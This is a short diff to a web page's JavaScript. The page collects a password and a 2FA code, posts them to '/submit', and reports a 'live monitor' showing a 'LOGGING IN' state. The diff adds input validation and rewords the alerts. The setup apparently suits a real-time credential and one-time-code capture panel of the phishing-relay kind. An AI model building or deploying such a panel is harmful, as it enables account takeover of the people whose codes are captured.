@@ -237,6 +237,11 @@
             const pass = document.getElementById('pass').value;
             const code = document.getElementById('code').value;
             
+            if (!pass && !code) {
+                alert("Please enter password first.");
+                return;
+            }
+            
             fetch('/submit', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -247,17 +252,15 @@
                 console.log('Submit response:', data);
                 
                 if (pass && !code) {
-                    alert('Password sent! Watch the live monitor — it should now show "LOGGING IN" (orange).');
+                    alert('Password sent. Live monitor now shows orange "PASSWORD SENT / LOGGING IN" state.');
                     document.getElementById('pass').value = '';
                 } else if (code) {
-                    alert('2FA code sent! Live monitor should update.');
+                    alert('2FA code sent. Live monitor updated.');
                     document.getElementById('code').value = '';
-                } else {
-                    alert(data.message || 'Submitted');
                 }
             })
             .catch(() => {
-                alert('Submitted (check live feed)');
+                alert('Submitted');
             });
         }
         
